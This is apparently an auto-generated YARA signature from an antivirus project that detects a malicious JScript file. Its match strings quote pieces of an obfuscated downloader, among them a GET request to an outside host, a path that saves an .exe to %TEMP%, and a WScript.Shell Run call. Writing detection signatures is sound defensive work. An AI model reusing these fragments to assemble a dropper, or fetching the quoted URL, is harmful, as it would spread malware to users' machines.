rule sig_20160328_5297f23f068b84a388884bc4f4cedf9c {
  meta:
    description = "datamaliciousorder - file 20160328_5297f23f068b84a388884bc4f4cedf9c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "41c83a9d304925bd26edb139d4e925a318c292304df322d8fdee607d4d931161"

  strings:
    $s1  = "function Mxeqlvvcw() {return Bhtts[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"MgIoIBgiK.exe\";};" fullword ascii
    $s2  = "do {WScript[Zowpbgj](Aogfs() * 11)} while (Ylkahvmpkk[\"readystate\"] < 4 );" fullword ascii
    $s3  = "Ylkahvmpkk[Ccergnjqjm](\"GET\", \"http://chibitesafaris.co.tz/ke7sif\", false);" fullword ascii
    $s4  = "function Eowslnadg(Trqkcyqj, Modlttsp){return Trqkcyqj - Modlttsp;};" fullword ascii
    $s5  = "var Bhtts = function Igzgg() {return WScript[Vcrvdivnok](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Kzwqqp() {return ((Urzxvro == true) && (Urzxvro == Ogevplwqln)) ? 1 : Sixfg;};" fullword ascii
    $s7  = "function Rfvuszp(Vdbqcd){Bhtts[\"Run\"](Vdbqcd, Sixfg, Sixfg);};" fullword ascii
    $s8  = "function Crpgvnjcl(){return Vcrvdivnok;};" fullword ascii
    $s9  = "function Yasnapxad(Crrnavtuwb) {var Soczk = (1, 2, 3, 4, 5, Crrnavtuwb); return Soczk;};" fullword ascii
    $s10 = "Urzxvro = true; " fullword ascii
    $s11 = "var Ogevplwqln = false;" fullword ascii
    $s12 = "var Cglky = false;" fullword ascii
    $s13 = "var Urzxvro = false;" fullword ascii
    $s14 = "Ogevplwqln = true; " fullword ascii
    $s15 = "function Fvmantyn(){return Tmsswz;};" fullword ascii
    $s16 = "function Aogfs(){return 22;};" fullword ascii
    $s17 = "return Eowslnadg(Rodtv, Qpayy);" fullword ascii
    $s18 = " while (Xnqhkmd){" fullword ascii
    $s19 = "function Tqeahlk()" fullword ascii
    $s20 = "var Adnodzcn = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}